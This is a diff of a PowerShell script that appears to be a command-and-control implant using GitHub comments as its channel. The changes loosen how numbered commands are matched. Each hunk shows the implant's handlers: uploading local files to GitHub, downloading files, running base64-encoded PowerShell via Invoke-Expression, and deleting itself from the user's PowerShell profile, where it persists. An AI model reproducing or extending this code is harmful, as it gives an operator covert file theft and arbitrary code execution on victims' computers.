@@ -198,7 +198,7 @@ function Start-LoopMode
         {
             ForEach($comment in $comments)
             {
-                If($comment.body -like "[1]:*")
+                If(($comment.body).IndexOf('[1]') -ne -1)
                 {
                     $mostRecentConfigurationCommandID = $comment.ID
                     Write-Console -Message ("Identified configuration command in comment ID " + $mostRecentConfigurationCommandID + ".")
@@ -380,7 +380,7 @@ function Start-LoopMode
             ForEach($comment in $comments)
             {
                 #Refresh and upload searcher log
-                If($comment.body -like "[7]")
+                If(($comment.body).IndexOf('[7]') -ne -1)
                 {
                     Write-Console -Message ("Searcher log refresh command received. Updating the log...")
                     Update-SearcherLog
@@ -392,7 +392,7 @@ function Start-LoopMode
                 }
 
                 #Upload file to GitHub
-                If($comment.body -like "[9]:*")
+                If(($comment.body).IndexOf('[9]') -ne -1)
                 {
                     Write-Console -Message ("File upload command received. Checking if target file exists...")
                     $targetFilePath = ($comment.body).replace("[9]:","")
@@ -416,7 +416,7 @@ function Start-LoopMode
                 }
 
                 #Download file from GitHub
-                If($comment.body -like "[11]:*")
+                If(($comment.body).IndexOf('[11]') -ne -1)
                 {
                     Write-Console -Message ("File download command received. Getting file path...")
 
@@ -452,7 +452,7 @@ function Start-LoopMode
                 }
 
                 #Execute code (PowerShell only via IEX)
-                If($comment.body -like "[12]:*")
+                If(($comment.body).IndexOf('[12]') -ne -1)
                 {
                     Write-Console -Message ("Code execution command comment received. Executing...")
                     Invoke-Expression -Command ([System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String(($comment.body).Replace("[12]:",""))))
@@ -462,7 +462,7 @@ function Start-LoopMode
                 }
 
                 #Remove self
-                If($comment.body -like "[13]")
+                If(($comment.body).IndexOf('[13]') -ne -1)
                 {
                     Write-Console -Message ("Remove self command received. Deleting...")
                     Remove-Item ($env:USERPROFILE + "\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1")
